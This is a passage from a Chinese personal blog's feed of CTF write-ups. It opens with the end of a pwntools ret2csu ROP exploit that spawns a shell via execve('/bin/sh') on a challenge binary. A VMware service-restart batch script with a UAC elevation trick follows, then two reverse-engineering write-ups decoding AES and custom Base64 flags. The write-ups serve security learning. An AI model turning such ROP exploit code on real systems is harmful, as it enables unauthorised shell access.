operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'execve'</span><span class="token punctuation">]</span><span class="token comment"># 获取 bss 段地址, 在此写入 execve 函数地址和 '/bin/sh'</span>bss_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 第二次 csu 调用 read 函数向 bss 段写入</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>gadget1_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read_got_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>gadget2_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x38</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Hello, World\n"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token comment"># 将 execve 函数地址和 '/bin/sh' 写入 bss 段</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>execve_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>  <span class="token comment"># 一次写入，写成两次 io.send 就错了</span><span class="token comment"># 第三次 csu 执行 bss_addr 处的 execve 函数，将 bss_addr + 8 处的 '/bin/sh' 作为参数</span><span class="token comment"># 执行 execve("/bin/sh", 0, 0)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>gadget1_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>gadget2_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x38</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Hello, World\n"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTFwiki-ret2csu7.png" alt="CTFwiki-ret2csu7.png"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Pwn </tag>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VM虚拟机显示 “未能开启xxx.vmx”</title>
      <link href="/posts/136f9f8e.html"/>
      <url>/posts/136f9f8e.html</url>
      
        <content type="html"><![CDATA[<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><blockquote><p>最近有时候打开 VM 虚拟机时，会弹出：<code>未能开启“xxx(虚拟机路径)\xxx(虚拟机名).vmx”</code> 的警告，导致虚拟机无法正常开机</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/VM%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%9C%AA%E8%83%BD%E5%BC%80%E5%90%AF%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%951.png" alt="VM虚拟机未能开启解决办法1.png"></p><hr><h1 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h1><blockquote><p>产生原因是 VMware 的服务出现问题，需要重新启动服务，VM 即可恢复正常</p></blockquote><hr><h1 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h1><h2 id="手动修改"><a href="#手动修改" class="headerlink" title="手动修改"></a>手动修改</h2><p>打开服务，可先通过 <code>ctrl + alt + delete</code> 打开任务管理器，在左侧栏选中服务</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/VM%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%9C%AA%E8%83%BD%E5%BC%80%E5%90%AF%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%952.png" alt="VM虚拟机未能开启解决办法2.png"></p><p>往下翻，找到名称为 <code>VMAuthdService</code> 的服务</p><p>右键，重新启动</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/VM%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%9C%AA%E8%83%BD%E5%BC%80%E5%90%AF%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%953.png" alt="VM虚拟机未能开启解决办法3.png"></p><p>再次打开 VM 中的虚拟机，发现问题解决，不会报错了</p><hr><h2 id="脚本修改"><a href="#脚本修改" class="headerlink" title="脚本修改"></a>脚本修改</h2><blockquote><p>每次都手动去重新启动服务未免太麻烦，这里利用脚本自动重启</p></blockquote><p>首先新建一个 txt 文本文件，例如：<code>VM.txt</code></p><p>写入如下内容：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">@echo on net stop <span class="token string">"VMAuthdService"</span>     net start <span class="token string">"VMAuthdService"</span>pause<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>其中 <code>@echo on</code> 表示 cmd 命令回显，后面两条命令用来停止和开启 <code>VMAuthdService 服务</code>，<code>pause</code> 表示命令执行完后不关闭 cmd 窗口</p><p>除此之外，还需要有管理员权限</p><p>在 VM.txt 最前面加上一段代码：<em>（这段代码用来调用管理员权限）</em></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">@echo off%1 mshta vbscript:CreateObject<span class="token punctuation">(</span><span class="token string">"Shell.Application"</span><span class="token punctuation">)</span>.ShellExecute<span class="token punctuation">(</span><span class="token string">"cmd.exe"</span>,<span class="token string">"/c %~s0 ::"</span>,<span class="token string">""</span>,<span class="token string">"runas"</span>,1<span class="token punctuation">)</span><span class="token punctuation">(</span>window.close<span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token builtin class-name">exit</span><span class="token builtin class-name">cd</span> /d <span class="token string">"%~dp0"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>所以，最终代码如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">@echo off%1 mshta vbscript:CreateObject<span class="token punctuation">(</span><span class="token string">"Shell.Application"</span><span class="token punctuation">)</span>.ShellExecute<span class="token punctuation">(</span><span class="token string">"cmd.exe"</span>,<span class="token string">"/c %~s0 ::"</span>,<span class="token string">""</span>,<span class="token string">"runas"</span>,1<span class="token punctuation">)</span><span class="token punctuation">(</span>window.close<span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token builtin class-name">exit</span><span class="token builtin class-name">cd</span> /d <span class="token string">"%~dp0"</span>@echo on net stop <span class="token string">"VMAuthdService"</span>     net start <span class="token string">"VMAuthdService"</span>pause<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将 <code>VM.txt</code> 重命名为 <code>VM.bat</code>，双击即可运行：<em>（会自动跳出询问管理员权限的窗口，点击 “是” 即可）</em></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/VM%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%9C%AA%E8%83%BD%E5%BC%80%E5%90%AF%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%954.png" alt="VM虚拟机未能开启解决办法4.png"></p><p>以后 VM 再出现这个报错，直接双击 <code>VM.bat</code> 即可</p><hr><h3 id="设置开机自启动"><a href="#设置开机自启动" class="headerlink" title="设置开机自启动"></a>设置开机自启动</h3><p>另外，可以将路径 <code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code> 复制到文件管理器打开</p><p>然后将 <code>VM.bat</code> 复制到该路径下，重启电脑</p><p>以后 <code>VM.bat</code> 就会开机自启动了</p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【楚慧杯 2023】Level_up</title>
      <link href="/posts/6ff303c9.html"/>
      <url>/posts/6ff303c9.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p><mark>当给出的 apk 中缺失某个关键函数时，有可能藏在 so 文件里头</mark></p></li><li><p>涉及到 AES 编码时，例如 <mark>AES128 的解密用到字节编码，最好是使用 python 脚本进行解密</mark></p></li></ul><hr><p><a href="http://2023chb.manage.nsctf.cn/CTF/answering">（2023年3月30日）【楚慧杯 2023】Level_up</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>下载解压得到 chall 文件夹：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%B9%96%E5%8C%97%E7%9C%81%E7%AC%AC%E4%B8%83%E5%B1%8A%E6%A5%9A%E6%85%A7%E6%9D%AF-Level_up1.png" alt="湖北省第七届楚慧杯-Level_up1.png"></p><p>注意文件夹里的内容，<code>chall.apk</code> 是打包好的安卓程序，<code>chall</code> 是 <code>chall.apk</code> 的源文件，<code>chall.apk.cache</code> 是缓存文件（具体干什么用的不太清楚）</p><p>用 jadx-gui 打开 chall.apk，定位到 <code>MainActivity</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%B9%96%E5%8C%97%E7%9C%81%E7%AC%AC%E4%B8%83%E5%B1%8A%E6%A5%9A%E6%85%A7%E6%9D%AF-Level_up2.png" alt="湖北省第七届楚慧杯-Level_up2.png"></p><p>注意到关键判断语句：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%B9%96%E5%8C%97%E7%9C%81%E7%AC%AC%E4%B8%83%E5%B1%8A%E6%A5%9A%E6%85%A7%E6%9D%AF-Level_up3.png" alt="湖北省第七届楚慧杯-Level_up3.png"></p><p>将用户的输入、用户输入的长度作为参数，经过 <code>check()</code> 函数进行处理，如果校验成功就显示 “right!!!”</p><p>点击 <code>check()</code> 函数，发现程序里只有 <code>check()</code> 函数的声明，却没有函数的内容：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%B9%96%E5%8C%97%E7%9C%81%E7%AC%AC%E4%B8%83%E5%B1%8A%E6%A5%9A%E6%85%A7%E6%9D%AF-Level_up4.png" alt="湖北省第七届楚慧杯-Level_up4.png"></p><p>在程序中搜索 check 关键字依然一无所获</p><p>然后比赛的时候进行到这里，我就一直卡在从程序中寻找 <code>check()</code> 函数的逻辑<br>（有一部分原因可能也是受了前面一道题 <code>Level_One</code> 的影响，以为校验逻辑就在程序里）</p><blockquote><p>后来看了其他队伍【丝绒Velvet】的 Writeup 我才恍然大悟<br><a href="https://mp.weixin.qq.com/s?__biz=Mzg3NDkyOTgxMg==&mid=2247483701&idx=1&sn=df4e34e48671c9edf3372308df7f1269&chksm=cec80acef9bf83d83a938775e57b55c948428c0849a15c5ec0ca420ae5bad03dc58683c0dcc6&mpshare=1&scene=23&srcid=0330grQBOEkM9P3KELybR5rm&sharer_sharetime=1680167468020&sharer_shareid=bd8cb5598a8e94f9f2d58edb9b65a190#rd">2023湖北省第七届“楚慧杯”网络空间安全实践能力竞赛-预赛 -丝绒WP</a><br>   其实这里是用到了动态链接库 so，<code>check()</code> 函数在源代码中没有，但是会从 so 文件中引用</p></blockquote><p>在 <code>chall</code> 文件夹内查看：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%B9%96%E5%8C%97%E7%9C%81%E7%AC%AC%E4%B8%83%E5%B1%8A%E6%A5%9A%E6%85%A7%E6%9D%AF-Level_up5.png" alt="湖北省第七届楚慧杯-Level_up5.png"></p><p><mark>通过与 jadx-gui 反编译出来的内容进行比对，发现后面这几个文件都是在程序中存在的，只有这个 lib 文件夹中的内容在程序中没有包含</mark></p><p>查看 <code>lib</code> 的内容：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%B9%96%E5%8C%97%E7%9C%81%E7%AC%AC%E4%B8%83%E5%B1%8A%E6%A5%9A%E6%85%A7%E6%9D%AF-Level_up6.png" alt="湖北省第七届楚慧杯-Level_up6.png"></p><p>发现这四个文件夹里各有一个文件名为 <code>libmobile2.so</code> 的文件</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%B9%96%E5%8C%97%E7%9C%81%E7%AC%AC%E4%B8%83%E5%B1%8A%E6%A5%9A%E6%85%A7%E6%9D%AF-Level_up7.png" alt="湖北省第七届楚慧杯-Level_up7.png"></p><p>但是在第一个文件 <code>arm64-v8a</code> 内，是这样的：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%B9%96%E5%8C%97%E7%9C%81%E7%AC%AC%E4%B8%83%E5%B1%8A%E6%A5%9A%E6%85%A7%E6%9D%AF-Level_up8.png" alt="湖北省第七届楚慧杯-Level_up8.png"></p><p>注意到除 <code>libmobile2.so</code> 外其他文件的后缀，<code>.id0</code>、<code>.id1</code>、<code>.id2</code> 这不就是 IDA 留下的数据库文件吗</p><p>在 exeinfo PE 中看看：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%B9%96%E5%8C%97%E7%9C%81%E7%AC%AC%E4%B8%83%E5%B1%8A%E6%A5%9A%E6%85%A7%E6%9D%AF-Level_up9.png" alt="湖北省第七届楚慧杯-Level_up9.png"></p><p>64 位 elf 文件，用 IDA 打开，选择直接打开现存的数据库文件：</p><p>在函数中搜索 <code>main</code>，定位到主函数</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%B9%96%E5%8C%97%E7%9C%81%E7%AC%AC%E4%B8%83%E5%B1%8A%E6%A5%9A%E6%85%A7%E6%9D%AF-Level_up10.png" alt="湖北省第七届楚慧杯-Level_up10.png"></p><p>查看一下字符串，<code>shift + F12</code>，发现端倪：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%B9%96%E5%8C%97%E7%9C%81%E7%AC%AC%E4%B8%83%E5%B1%8A%E6%A5%9A%E6%85%A7%E6%9D%AF-Level_up11.png" alt="湖北省第七届楚慧杯-Level_up11.png"></p><p>跟进 <code>gOuWlCTi+hhzCn6rWxDm8IuuBwiOtM+V/m39bthXTeT3E6WYrLU0CDqG76Kvpkmc</code> 所在地址：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%B9%96%E5%8C%97%E7%9C%81%E7%AC%AC%E4%B8%83%E5%B1%8A%E6%A5%9A%E6%85%A7%E6%9D%AF-Level_up12.png" alt="湖北省第七届楚慧杯-Level_up12.png"></p><p>发现他们定义在 <code>start()</code> 函数中</p><p>根据形式，函数 <code>std::string::basic_string&lt;decltype(nullptr)&gt;</code> 应该是字符串复制操作<br><code>key = &quot;followyourheart!&quot;</code><br><code>enc = &quot;gOuWlCTi+hhzCn6rWxDm8IuuBwiOtM+V/m39bthXTeT3E6WYrLU0CDqG76Kvpkmc&quot;</code><br>得到了 main() 函数中的密文 <code>enc</code>，还得到了一个 <code>key</code> 应该是某种加密的密钥</p><p>同时，还注意到字符串中有 Base64 加密的码表：<code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</code><br>但是 Base64 本身是不需要密钥的，猜测可能有多种加密方法</p><p>继续关注 <code>main()</code> 函数<br>很明显注意到这里有一个加密函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%B9%96%E5%8C%97%E7%9C%81%E7%AC%AC%E4%B8%83%E5%B1%8A%E6%A5%9A%E6%85%A7%E6%9D%AF-Level_up13.png" alt="湖北省第七届楚慧杯-Level_up13.png"></p><p>跟进，到 <code>encode()</code> 函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%B9%96%E5%8C%97%E7%9C%81%E7%AC%AC%E4%B8%83%E5%B1%8A%E6%A5%9A%E6%85%A7%E6%9D%AF-Level_up14.png" alt="湖北省第七届楚慧杯-Level_up14.png"></p><p>加密方式已经告知了，一个 AES128，一个 Base64，结合前面观察到的字符串，大体已经可以确定了</p><p><mark>由于在 main() 函数中，发现 <code>cipher::Encrypt::encode()</code> 之后虽然有一大堆代码，但是并没有改变 <code>enc</code> 的值</mark></p><p>根据代码的意思，加密流程是先对明文进行 <code>AES128（ECB）</code> 加密（密钥是 <code>followyourheart!</code>），然后进行 <code>Base64</code> 加密，得到密文 <code>enc</code><br>因此先对 <code>enc</code> 进行 <code>Base64</code> 解码，然后进行 <code>AES128（ECB）</code> 解码，即可得到 flag</p><p>但是注意，<code>AES128</code> 是按照 16字节（128 bit）为一组进行加密，所以这里要对字节进行操作<br>使用普通的在线网站进行解密是不行的，例如：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%B9%96%E5%8C%97%E7%9C%81%E7%AC%AC%E4%B8%83%E5%B1%8A%E6%A5%9A%E6%85%A7%E6%9D%AF-Level_up15.png" alt="湖北省第七届楚慧杯-Level_up15.png"></p><p>因此，利用 python 脚本进行解码</p><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64  <span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES    enc <span class="token operator">=</span> <span class="token string">b'gOuWlCTi+hhzCn6rWxDm8IuuBwiOtM+V/m39bthXTeT3E6WYrLU0CDqG76Kvpkmc'</span>  key <span class="token operator">=</span> <span class="token string">b'followyourheart!'</span>    string1 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>enc<span class="token punctuation">)</span>  <span class="token comment"># 先对enc进行Base64解密  </span>  string2 <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_ECB<span class="token punctuation">)</span>  <span class="token comment"># 创建一个AES对象string2，根据题意是ECB加密模式  </span>flag <span class="token operator">=</span> string2<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>string1<span class="token punctuation">)</span>  <span class="token comment"># AES128 ECB解密  </span>  <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>flag{6b1df900-1284-11ed-9fa7-5405dbe5e745}</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%B9%96%E5%8C%97%E7%9C%81%E7%AC%AC%E4%B8%83%E5%B1%8A%E6%A5%9A%E6%85%A7%E6%9D%AF-Level_up16.png" alt="湖北省第七届楚慧杯-Level_up16.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【楚慧杯 2023】Level_One</title>
      <link href="/posts/f0b0acd4.html"/>
      <url>/posts/f0b0acd4.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p><mark>安卓逆向如何获取数据资源</mark></p></li><li><p><mark>更换码表的 Base64</mark> 加解密</p></li></ul><hr><p><a href="http://2023chb.manage.nsctf.cn/CTF/answering">（2023年3月30日）【楚慧杯 2023】Level_One</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>下载解压得到一个 chall.apk 文件</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2022%E7%AC%AC%E4%B8%83%E5%B1%8A%E6%A5%9A%E6%85%A7%E6%9D%AF-Level_One1.png" alt="2022第七届楚慧杯-Level_One1.png"></p><p>界面是常规的输入 flag 然后进行校验，没什么特别的</p><p>在 jadx-gui 中打开，找到 <code>MainActivity</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2022%E7%AC%AC%E4%B8%83%E5%B1%8A%E6%A5%9A%E6%85%A7%E6%9D%AF-Level_One2.png" alt="2022第七届楚慧杯-Level_One2.png"></p><p>定位到关键判断语句：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2022%E7%AC%AC%E4%B8%83%E5%B1%8A%E6%A5%9A%E6%85%A7%E6%9D%AF-Level_One3.png" alt="2022第七届楚慧杯-Level_One3.png"></p><p>获取用户输入，并转化为 utf-8 编码，以字节形式调用 <code>Encrypt()</code> 函数进行加密，然后与 <code>C0535R.string.enc</code> 进行比较，如果相同则获得 flag</p><p><code>Encrypt()</code> 函数的内容在下方给出：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2022%E7%AC%AC%E4%B8%83%E5%B1%8A%E6%A5%9A%E6%85%A7%E6%9D%AF-Level_One4.png" alt="2022第七届楚慧杯-Level_One4.png"></p><p>形式看起来比较复杂，但是可以注意到代码后面一段：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2022%E7%AC%AC%E4%B8%83%E5%B1%8A%E6%A5%9A%E6%85%A7%E6%9D%AF-Level_One5.png" alt="2022第七届楚慧杯-Level_One5.png"></p><p>这里对 <code>bArr</code> 的长度做了一个余 3 的操作，余数为 <code>length2</code><br>并且，还对余数的两种情况分别进行了讨论：<br>当 <code>length2 = 1</code> 时，会在最后添加 <code>&quot;%&amp;&quot;</code><br>当 <code>length2 = 2</code> 时，会在最后添加 <code>&quot;*&quot;</code></p><p>同时，java 中 <code>charAt()</code> 方法用于返回字符串中指定索引位置的字符，这里利用 <code>append()</code> 向 <code>sb</code> 插入索引处的值</p><p>这样的特点非常类似 Base64 加密算法，但是不同的是：这里根据余数为 <code>1</code> 或 <code>2</code> 添加的不是 <code>&quot;==&quot;</code> 和 <code>&quot;=&quot;</code></p><p>继续观察，可以发现 <code>append()</code> 插入用到的索引表 <code>string</code> 来自 <code>C0535R.string.table</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2022%E7%AC%AC%E4%B8%83%E5%B1%8A%E6%A5%9A%E6%85%A7%E6%9D%AF-Level_One6.png" alt="2022第七届楚慧杯-Level_One6.png"></p><p>在资源中定位这个文件：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2022%E7%AC%AC%E4%B8%83%E5%B1%8A%E6%A5%9A%E6%85%A7%E6%9D%AF-Level_One7.png" alt="2022第七届楚慧杯-Level_One7.png"></p><p>可以得到表中的内容：<code>n4/Xv90ElB32S6MmyK+iVIgkjU17CDGaLYxeuzsc8TqNOtrJWPfRp=HFhAwdb5oZQ</code><br>包含大写字母、小写字母、数字 0-9、<code>&#39;+&#39;</code>、<code>&#39;/&#39;</code>，很符合 Base64 码表的形式，只是原始码表的顺序被打乱了</p><p>但是根据这里码表的变动，且多出一个 <code>&#39;=&#39;</code>，导致 <code>Encrypt()</code> 函数中最后根据余数个数添加的不是 <code>&#39;==&#39;</code> 和 <code>&#39;=&#39;</code>，也就基本可以确定 <code>Encrypt()</code> 函数是更换过码表的 Base64 加密了</p><p>在资源里找到 if 条件中对比的数据 <code>C0535R.string.enc</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2022%E7%AC%AC%E4%B8%83%E5%B1%8A%E6%A5%9A%E6%85%A7%E6%9D%AF-Level_One8.png" alt="2022第七届楚慧杯-Level_One8.png"></p><p>得到 <code>enc</code> 的内容：<code>UsPYUFORMXnHSXIe6xpFSilR2iKs6RvtjeVFSfpHSX9zM0Sp6XVFjeK5</code></p><p>利用更换码表的 Base64 解密即可 <em>（详见《CTF逆向中的脚本》）</em></p><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding:utf-8</span>s <span class="token operator">=</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>  <span class="token comment"># 原始码表</span><span class="token keyword">def</span> <span class="token function">my_base64_encode</span><span class="token punctuation">(</span>inputs<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 将字符串转化为2进制</span>    bin_str <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> inputs<span class="token punctuation">:</span>        x <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">bin</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0b'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>        bin_str<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'&#123;:0>8&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># print(bin_str)</span>    <span class="token comment"># 输出的字符串</span>    outputs <span class="token operator">=</span> <span class="token string">""</span>    <span class="token comment"># 不够三倍数，需补齐的次数</span>    nums <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">while</span> bin_str<span class="token punctuation">:</span>        <span class="token comment"># 每次取三个字符的二进制</span>        temp_list <span class="token operator">=</span> bin_str<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>temp_list<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">:</span>            nums <span class="token operator">=</span> <span class="token number">3</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>temp_list<span class="token punctuation">)</span>            <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>temp_list<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">:</span>                temp_list <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token string">'0'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">]</span>        temp_str <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>temp_list<span class="token punctuation">)</span>        <span class="token comment"># print(temp_str)</span>        <span class="token comment"># 将三个8字节的二进制转换为4个十进制</span>        temp_str_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token 